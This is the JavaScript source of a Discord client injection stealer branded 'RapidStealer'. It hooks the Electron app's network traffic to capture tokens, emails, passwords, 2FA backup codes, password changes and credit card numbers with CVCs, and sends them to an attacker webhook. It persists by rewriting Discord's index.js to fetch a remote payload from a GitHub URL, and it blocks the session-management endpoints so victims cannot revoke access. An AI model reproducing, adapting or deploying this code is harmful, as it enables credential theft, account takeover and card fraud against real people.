const fs = require('fs');
const os = require('os');
const https = require('https');
const args = process.argv;
const path = require('path');
const querystring = require('querystring');

const {
    BrowserWindow,
    session,
} = require('electron');

const CONFIG = {
    webhook: "%WEBHOOK%",
    injection_url: "https://raw.githubusercontent.com/axelancexld/conikgames.github.io/main/img/sa.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    },
    API: "https://discord.com/api/v9/users/@me",
    badges: {
        Discord_Emloyee: {
            Value: 1,
            Emoji: "<:8485discordemployee:1163172252989259898>",
            Rare: true,
        },
        Partnered_Server_Owner: {
            Value: 2,
            Emoji: "<:9928discordpartnerbadge:1163172304155586570>",
            Rare: true,
        },
        HypeSquad_Events: {
            Value: 4,
            Emoji: "<:9171hypesquadevents:1163172248140660839>",
            Rare: true,
        },
        Bug_Hunter_Level_1: {
            Value: 8,
            Emoji: "<:4744bughunterbadgediscord:1163172239970140383>",
            Rare: true,
        },
        Early_Supporter: {
            Value: 512,
            Emoji: "<:5053earlysupporter:1163172241996005416>",
            Rare: true,
        },
        Bug_Hunter_Level_2: {
            Value: 16384,
            Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>",
            Rare: true,
        },
        Early_Verified_Bot_Developer: {
            Value: 131072,
            Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>",
            Rare: true,
        },
        House_Bravery: {
            Value: 64,
            Emoji: "<:6601hypesquadbravery:1163172246492287017>",
            Rare: false,
        },
        House_Brilliance: {
            Value: 128,
            Emoji: "<:6936hypesquadbrilliance:1163172244474822746>",
            Rare: false,
        },
        House_Balance: {
            Value: 256,
            Emoji: "<:5242hypesquadbalance:1163172243417858128>",
            Rare: false,
        },
        Active_Developer: {
            Value: 4194304,
            Emoji: "<:1207iconactivedeveloper:1163172534443851868>",
            Rare: false,
        },
        Certified_Moderator: {
            Value: 262144,
            Emoji: "<:4149blurplecertifiedmoderator:1163172255489085481>",
            Rare: true,
        },
        Spammer: {
            Value: 1048704,
            Emoji: "⌨️",
            Rare: false,
        },
    },
};

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

const clearAllUserData = () => {
    executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
    executeJS("location.reload()");
};

const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);

const request = async (method, url, headers, data) => {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: method,
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
    };

    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];
    const req = https.request(options);
    if (data) req.write(data);
    req.end();

    return new Promise((resolve, reject) => {
        req.on("response", res => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => resolve(data));
        });
    });
};

const hooker = async (content, token, account) => {
    const badges = getBadges(account.public_flags);
    const nitro = getNitro(account.premium_type);
    const billing = await getBilling(token);
    const friends = await getFriends(token);
    const servers = await getServers(token);
    const ip = await getIP();

    const payload = {
        username: "t.me/rapidstealer",
        avatar_url: "https://media.discordapp.net/attachments/1266493389365448754/1425475767252291724/cover_1.png?ex=68e7b942&is=68e667c2&hm=7009f2f6f58fc9e65e519cfa7b051b78aee9db70503f73e952db0499ceab985f&",
        embeds: [
            {
                author: {
                    name: "t.me/rapidstealer - Discord Injection",
                    icon_url: "https://media.discordapp.net/attachments/1266493389365448754/1425475767252291724/cover_1.png?ex=68e7b942&is=68e667c2&hm=7009f2f6f58fc9e65e519cfa7b051b78aee9db70503f73e952db0499ceab985f&",
                },
                color: 0x2b2d31,
                fields: [
                    {
                        name: "<:13129chromeheart:1425428161889571010> Token",
                        value: `[Click to Copy!](http://www.getyour.work.gd/${token})`,
                        inline: true
                    },
                    {
                        name: "<:35492crystals:1425428123058569236> **Username**",
                        value: `${account.username}#${account.discriminator || ''}`,
                        inline: true
                    },{
                        name: "<:19381bubble:1425428173646204928> **ID**",
                        value: `${account.id}`,
                        inline: true
                    },{
                        name: "<:26411prettymoon:1425428180814270556> **Mail**",
                        value: `${`\`` + account.email + `\`` || '`None`'}`,
                        inline: true
                    },{
                        name: "**<:66181duostars:1425428137516204195> Phone**",
                        value: `${`\`` + account.phone + `\`` || '`None`'}`,
                        inline: true
                    },
                    {
                        name: "<:85495star:1425428149679685745> **2FA**",
                        value: `${account.mfa_enabled ? '<:32040successfulverificationids:1426857164877729823>' : '<:81496blockedids:1426857163640275104>'}`,
                        inline: true
                    },
                    {
                        name: "<:57086star:1425428133124771860> **Verified**",
                        value: `${account.verified ? '<:32040successfulverificationids:1426857164877729823>' : '<:81496blockedids:1426857163640275104>'}`,
                        inline: true
                    },
                    {
                        name: "<:15848butterfly:1425428248501817468> Badges",
                        value: badges || "`None`",
                        inline: true
                    },
                    {
                        name: "<:30111gothrose:1425428186694549625> Billing",
                        value: billing || "`None`",
                        inline: true
                    },
                    {
                        name: "<:79071starrymoon:1425428147314229269> IP Address",
                        value: ip || "`Unknown`",
                        inline: true
                    }
                ],
                thumbnail: {
                    url: account.avatar ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}?size=4096` : `https://cdn.discordapp.com/embed/avatars/0.png`
                },
                footer: {
                    text: "@RapidStealer | https://discord.gg/MRrhCrH2bw"
                },
                timestamp: new Date()
            }, {
                color: 0x2b2d31,
                description: friends.message,
                author: {
                    name: "Rare Friends",
                    icon_url: "https://media.discordapp.net/attachments/1266493389365448754/1425475767252291724/cover_1.png?ex=68e7b942&is=68e667c2&hm=7009f2f6f58fc9e65e519cfa7b051b78aee9db70503f73e952db0499ceab985f&",
                },
                footer: {
                    text: "@RapidStealer | https://discord.gg/MRrhCrH2bw",
                    icon_url: "https://media.discordapp.net/attachments/1266493389365448754/1425475767252291724/cover_1.png?ex=68e7b942&is=68e667c2&hm=7009f2f6f58fc9e65e519cfa7b051b78aee9db70503f73e952db0499ceab985f&",
                },
            },{
                color: 0x2b2d31,
                description: servers.message,
                author: {
                    name: "Rare Servers",
                    icon_url: "https://media.discordapp.net/attachments/1266493389365448754/1425475767252291724/cover_1.png?ex=68e7b942&is=68e667c2&hm=7009f2f6f58fc9e65e519cfa7b051b78aee9db70503f73e952db0499ceab985f&",
                },
                footer: {
                    text: "@RapidStealer | https://discord.gg/MRrhCrH2bw",
                    icon_url: "https://media.discordapp.net/attachments/1266493389365448754/1425475767252291724/cover_1.png?ex=68e7b942&is=68e667c2&hm=7009f2f6f58fc9e65e519cfa7b051b78aee9db70503f73e952db0499ceab985f&",
                },
            },
        ]
    };

    if (content && content.embeds && content.embeds[0] && content.embeds[0].fields) {
        payload.embeds[0].fields = [...payload.embeds[0].fields, ...content.embeds[0].fields];
    }

    await request("POST", CONFIG.webhook, {
        "Content-Type": "application/json"
    }, JSON.stringify(payload));
};

const getIP = async () => {
    try {
        const response = await request("GET", "https://api.ipify.org?format=json", {});
        const data = JSON.parse(response);
        return data.ip || "Unknown";
    } catch (error) {
        return "Unknown";
    }
};

const fetch = async (endpoint, headers) => {
    return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
};

const fetchAccount = async token => await fetch("", {
    "Authorization": token
});
const fetchBilling = async token => await fetch("/billing/payment-sources", {
    "Authorization": token
});
const fetchServers = async token => await fetch("/guilds?with_counts=true", {
    "Authorization": token
});
const fetchFriends = async token => await fetch("/relationships", {
    "Authorization": token
});

const getNitro = flags => {
    switch (flags) {
        case 1:
            return '`Nitro Classic`';
        case 2:
            return '`Nitro Boost`';
        case 3:
            return '`Nitro Basic`';
        default:
            return '`❌`';
    }
};

const getBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value) badges += b.Emoji + ' ';
    }
    return badges || '`❌`';
}

const getRareBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value && b.Rare) badges += b.Emoji + ' ';
    }
    return badges;
}

const getBilling = async token => {
    const data = await fetchBilling(token);
    let billing = '';
    data.forEach((x) => {
        if (!x.invalid) {
            switch (x.type) {
                case 1:
                    billing += '💳 ';
                    break;
                case 2:
                    billing += '<:paypal:1148653305376034967> ';
                    break;
            }
        }
    });
    return billing || '`❌`';
};

const getFriends = async token => {
    const friends = await fetchFriends(token);

    const filteredFriends = friends.filter((user) => {
        return user.type == 1
    })
    let rareUsers = "";
    for (const acc of filteredFriends) {
        var badges = getRareBadges(acc.user.public_flags)
        if (badges != "") {
            if (!rareUsers) rareUsers = "**Rare Friends:**\n";
            rareUsers += `${badges} ${acc.user.username}\n`;
        }
    }
    rareUsers = rareUsers || "*Nothing Important Here TwT*";

    return {
        message: rareUsers,
        totalFriends: friends.length,
    };
};

const getServers = async token => {
    const guilds = await fetchServers(token);

    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
    let rareGuilds = "";
    for (const guild of filteredGuilds) {
        if (rareGuilds === "") {
            rareGuilds += `**Rare Servers:**\n`;
        }
        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
    }

    rareGuilds = rareGuilds || "*Nothing Important Here TwT*";

    return {
        message: rareGuilds,
        totalGuilds: guilds.length,
    };
};

const EmailPassToken = async (email, password, token, action) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just ${action}!`,
        "embeds": [{
            "fields": [{
                "name": "Email",
                "value": "`" + email + "`",
                "inline": true
            }, {
                "name": "Password",
                "value": "`" + password + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const BackupCodesViewed = async (codes, token) => {
    const account = await fetchAccount(token)

    const filteredCodes = codes.filter((code) => {
        return code.consumed === false;
    });

    let message = "";
    for (let code of filteredCodes) {
        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
    }
    const content = {
        "content": `**${account.username}** just viewed his 2FA backup codes!`,
        "embeds": [{
            "fields": [{
                    "name": "Backup Codes",
                    "value": "```" + message + "```",
                    "inline": false
                },
                {
                    "name": "Email",
                    "value": "`" + account.email + "`",
                    "inline": true
                }, {
                    "name": "Phone",
                    "value": "`" + (account.phone || "None") + "`",
                    "inline": true
                }
            ]

        }]
    };

    hooker(content, token, account);
}

const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just changed his password!`,
        "embeds": [{
            "fields": [{
                "name": "New Password",
                "value": "`" + newPassword + "`",
                "inline": true
            }, {
                "name": "Old Password",
                "value": "`" + oldPassword + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const CreditCardAdded = async (number, cvc, month, year, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just added a credit card!`,
        "embeds": [{
            "fields": [{
                "name": "Number",
                "value": "`" + number + "`",
                "inline": true
            }, {
                "name": "CVC",
                "value": "`" + cvc + "`",
                "inline": true
            }, {
                "name": "Expiration",
                "value": "`" + month + "/" + year + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const PaypalAdded = async (token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
        "embeds": [{
            "fields": [{
                "name": "Email",
                "value": "`" + account.email + "`",
                "inline": true
            }, {
                "name": "Phone",
                "value": "`" + (account.phone || "None") + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const discordPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;

    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }

    if (fs.existsSync(resourcePath)) return {
        resourcePath,
        app
    };
    return {
        undefined,
        undefined
    };
})();

async function initiation() {
    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
        fs.rmdirSync(path.join(__dirname, 'initiation'));

        const token = await getToken();
        if (!token) return;

        const account = await fetchAccount(token)

        const content = {
            "content": `**${account.username}** just got injected!`,

            "embeds": [{
                "fields": [{
                    "name": "Email",
                    "value": "`" + account.email + "`",
                    "inline": true
                }, {
                    "name": "Phone",
                    "value": "`" + (account.phone || "None") + "`",
                    "inline": true
                }]
            }]
        };

        await hooker(content, token, account);
        clearAllUserData();
    }

    const {
        resourcePath,
        app
    } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, 'app');
    const packageJson = path.join(appPath, 'package.json');
    const resourceIndex = path.join(appPath, 'index.js');
    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(
            packageJson,
            JSON.stringify({
                    name: 'discord',
                    main: 'index.js',
                },
                null,
                4,
            ),
        );

        const startUpScript = `const fs = require('fs'), https = require('https');
  const indexJs = '${indexJs}';
  const bdPath = '${bdPath}';
  const fileSize = fs.statSync(indexJs).size
  fs.readFileSync(indexJs, 'utf8', (err, data) => {
      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
          init();
  })
  async function init() {
      https.get('${CONFIG.injection_url}', (res) => {
          const file = fs.createWriteStream(indexJs);
          res.replace('%WEBHOOK%', '${CONFIG.webhook}')
          res.pipe(file);
          file.on('finish', () => {
              file.close();
          });
      
      }).on("error", (err) => {
          setTimeout(init(), 10000);
      });
  }
  require('${path.join(resourcePath, 'app.asar')}')
  if (fs.existsSync(bdPath)) require(bdPath);`;
        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
    }
}

let email = "";
let password = "";
let initiationCalled = false;
const createWindow = () => {
    mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!initiationCalled) {
            await initiation();
            initiationCalled = true;
        }

        if (method !== 'Network.responseReceived') return;
        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
        if (![200, 202].includes(params.response.status)) return;

        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
            requestId: params.requestId
        });
        const responseData = JSON.parse(responseUnparsedData.body);

        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
            requestId: params.requestId
        });
        const requestData = JSON.parse(requestUnparsedData.postData);

        switch (true) {
            case params.response.url.endsWith('/login'):
                if (!responseData.token) {
                    email = requestData.login;
                    password = requestData.password;
                    return; // 2FA
                }
                EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                break;

            case params.response.url.endsWith('/register'):
                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                break;

            case params.response.url.endsWith('/totp'):
                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                break;

            case params.response.url.endsWith('/codes-verification'):
                BackupCodesViewed(responseData.backup_codes, await getToken());
                break;

            case params.response.url.endsWith('/@me'):
                if (!requestData.password) return;

                if (requestData.email) {
                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
                }

                if (requestData.new_password) {
                    PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                }
                break;
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');

    mainWindow.on('closed', () => {
        createWindow()
    });
}
createWindow();

session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != 'POST') return;
    switch (true) {
        case details.url.endsWith('tokens'):
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
            break;

        case details.url.endsWith('paypal_accounts'):
            PaypalAdded(await getToken());
            break;
    }
});

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
        cancel: true
    })
});

module.exports = require("./core.asar");
